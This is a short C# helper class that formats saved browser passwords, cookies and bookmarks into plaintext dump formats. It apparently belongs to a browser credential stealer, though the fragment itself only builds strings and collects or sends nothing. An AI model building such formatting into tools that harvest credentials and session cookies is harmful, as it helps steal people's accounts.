namespace exos;

internal sealed class BrowserUtils
{
	public static string FormatPassword(Password pPassword)
	{
		return $"Hostname: {pPassword.sUrl}\nUsername: {pPassword.sUsername}\nPassword: {pPassword.sPassword}\n\n";
	}

	public static string FormatCookie(Cookie cCookie)
	{
		return cCookie.sHostKey + "\tTRUE\t" + cCookie.sPath + "\tFALSE\t" + cCookie.sExpiresUtc + "\t" + cCookie.sName + "\t" + cCookie.sValue + "\r\n";
	}

	public static string FormatBookmark(Bookmark bBookmark)
	{
		if (!string.IsNullOrEmpty(bBookmark.sUrl))
		{
			return $"### {bBookmark.sTitle} ### ({bBookmark.sUrl})\n";
		}
		return $"### {bBookmark.sTitle} ###\n";
	}
}
